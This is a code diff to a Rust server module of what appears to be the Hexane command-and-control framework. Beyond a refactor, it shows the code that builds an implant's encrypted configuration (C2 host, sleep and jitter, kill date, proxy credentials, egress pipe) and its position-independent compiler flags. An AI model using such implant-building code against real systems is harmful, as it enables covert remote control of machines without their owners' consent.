@@ -1,12 +1,13 @@
 use std::fs;
 use std::str::FromStr;
 use rand::Rng;
+
 use crate::return_error;
-use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::error::Error;
-use crate::server::session::{CURDIR, USERAGENT};
 use crate::server::stream::Stream;
 use crate::server::types::{Compiler, Hexane, InjectionOptions, JsonData, NetworkOptions, UserSession, TRANSPORT_HTTP, TRANSPORT_PIPE};
+use crate::server::session::{CURDIR, USERAGENT};
+use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::utils::wrap_message;
 
 pub fn map_config(file_path: &String) -> crate::server::error::Result<Hexane> {
@@ -23,7 +24,7 @@ pub fn map_config(file_path: &String) -> crate::server::error::Result<Hexane> {
     };
 
     let group_id = 0;
-    let instance = Hexane {
+    let mut instance = Hexane {
 
         current_taskid: 0, peer_id: 0, group_id, build_type: 0, network_type: 0,
         crypt_key: vec![], shellcode: vec![], config_data: vec![],
@@ -46,109 +47,19 @@ pub fn map_config(file_path: &String) -> crate::server::error::Result<Hexane> {
         },
     };
 
+    check_instance(&mut instance)?;
     Ok(instance)
-}
-pub fn generate_config_bytes(instance: &mut Hexane) -> crate::server::error::Result<()> {
-    instance.crypt_key = crypt_create_key(16);
-
-    let mut patch = instance.create_binary_patch()?;
-    if instance.main.encrypt {
-        let patch_cpy = patch.clone();
-        patch = crypt_xtea(&patch_cpy, &instance.crypt_key, true)?;
-    }
-
-    instance.config_data = patch;
-    Ok(())
-}
-
-pub fn create_binary_patch(instance: &Hexane) -> crate::server::error::Result<Vec<u8>> {
-    let mut stream = Stream::new();
-
-    match instance.network_type {
-        TRANSPORT_HTTP  => stream.pack_byte(1),
-        TRANSPORT_PIPE  => stream.pack_byte(0),
-        _               => return return_error!("Invalid transport type"),
-    }
-
-    stream.pack_bytes(&instance.crypt_key);
-    stream.pack_string(&instance.main.hostname);
-
-    stream.pack_dword(instance.peer_id);
-    stream.pack_dword(instance.main.sleeptime);
-    stream.pack_dword(instance.main.jitter);
-
-    if let Some(ref modules) = instance.builder.loaded_modules {
-        for module in modules {
-            stream.pack_string(module);
-        }
-    }
-
-    let working_hours = if let Some(ref hours) = instance.main.working_hours {
-        i32::from_str(hours)?
-    } else {
-        0
-    };
-
-    let kill_date = if let Some(ref date) = instance.main.killdate {
-        i64::from_str(date)?
-    } else {
-        0
-    };
-
-    stream.pack_int32(working_hours);
-    stream.pack_dword64(kill_date);
-
-    match &instance.network.options {
-        NetworkOptions::Http(mut http) => {
-            stream.pack_wstring(&http.useragent.unwrap().as_str());
-            stream.pack_wstring(&http.address);
-            stream.pack_dword(http.port as u32);
-            stream.pack_dword(http.endpoints.len() as u32);
-
-            for endpoint in &http.endpoints {
-                stream.pack_wstring(endpoint);
-            }
-
-            stream.pack_string(&http.domain.unwrap().as_str());
-
-            if let Some(mut proxy) = &http.proxy {
-                let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
-                stream.pack_dword(1);
-                stream.pack_wstring(&proxy_url);
-                stream.pack_wstring(&proxy.username.unwrap().as_str());
-                stream.pack_wstring(&proxy.password.unwrap().as_str());
-            } else {
-                stream.pack_dword(0);
-            }
-        }
-        NetworkOptions::Smb(mut smb) => {
-            stream.pack_wstring(&smb.egress_pipe.unwrap().as_str());
-        }
-    }
-
-    Ok(stream.buffer)
 }
 
 pub(crate) fn setup_instance(instance: &mut Hexane) -> crate::server::error::Result<()> {
+    let mut rng = rand::thread_rng();
+
     if instance.main.debug {
-        instance.compiler.compiler_flags = String::from("\
-            -std=c++23 \
-            -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
-            -fno-ident -fpack-struct=8 -falign-functions=1 \
-            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
-            -falign-labels=1 -fPIC -fno-builtin \
-            -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
+        instance.compiler.compiler_flags = String::from("-std=c++23 -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
     } else {
-        instance.compiler.compiler_flags = String::from("\
-            -std=c++23 \
-            -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
-            -fno-ident -fpack-struct=8 -falign-functions=1 \
-            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
-            -falign-labels=1 -fPIC  -fno-builtin \
-            -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
+        instance.compiler.compiler_flags = String::from("-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
     }
 
-    let mut rng = rand::thread_rng();
     instance.peer_id = rng.random::<u32>();
     instance.group_id = 0;
 
@@ -252,3 +163,85 @@ pub(crate) fn check_instance(instance: &mut Hexane) -> crate::server::error::Res
 
     Ok(())
 }
+
+pub fn generate_config_bytes(instance: &mut Hexane) -> crate::server::error::Result<()> {
+    instance.crypt_key = crypt_create_key(16);
+
+    let mut patch = instance.create_binary_patch()?;
+    if instance.main.encrypt {
+        let patch_cpy = patch.clone();
+        patch = crypt_xtea(&patch_cpy, &instance.crypt_key, true)?;
+    }
+
+    instance.config_data = patch;
+    Ok(())
+}
+
+pub fn create_binary_patch(instance: &Hexane) -> crate::server::error::Result<Vec<u8>> {
+    let mut stream = Stream::new();
+
+    match instance.network_type {
+        TRANSPORT_HTTP  => stream.pack_byte(1),
+        TRANSPORT_PIPE  => stream.pack_byte(0),
+        _               => return return_error!("Invalid transport type"),
+    }
+
+    stream.pack_bytes(&instance.crypt_key);
+    stream.pack_string(&instance.main.hostname);
+
+    stream.pack_dword(instance.peer_id);
+    stream.pack_dword(instance.main.sleeptime);
+    stream.pack_dword(instance.main.jitter);
+
+    if let Some(ref modules) = instance.builder.loaded_modules {
+        for module in modules {
+            stream.pack_string(module);
+        }
+    }
+
+    let working_hours = if let Some(ref hours) = instance.main.working_hours {
+        i32::from_str(hours)?
+    } else {
+        0
+    };
+
+    let kill_date = if let Some(ref date) = instance.main.killdate {
+        i64::from_str(date)?
+    } else {
+        0
+    };
+
+    stream.pack_int32(working_hours);
+    stream.pack_dword64(kill_date);
+
+    match &instance.network.options {
+        NetworkOptions::Http(mut http) => {
+            stream.pack_wstring(&http.useragent.unwrap().as_str());
+            stream.pack_wstring(&http.address);
+            stream.pack_dword(http.port as u32);
+            stream.pack_dword(http.endpoints.len() as u32);
+
+            for endpoint in &http.endpoints {
+                stream.pack_wstring(endpoint);
+            }
+
+            stream.pack_string(&http.domain.unwrap().as_str());
+
+            if let Some(mut proxy) = &http.proxy {
+                let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
+                stream.pack_dword(1);
+                stream.pack_wstring(&proxy_url);
+                stream.pack_wstring(&proxy.username.unwrap().as_str());
+                stream.pack_wstring(&proxy.password.unwrap().as_str());
+            } else {
+                stream.pack_dword(0);
+            }
+        }
+        NetworkOptions::Smb(mut smb) => {
+            stream.pack_wstring(&smb.egress_pipe.unwrap().as_str());
+        }
+    }
+
+    Ok(stream.buffer)
+}
+
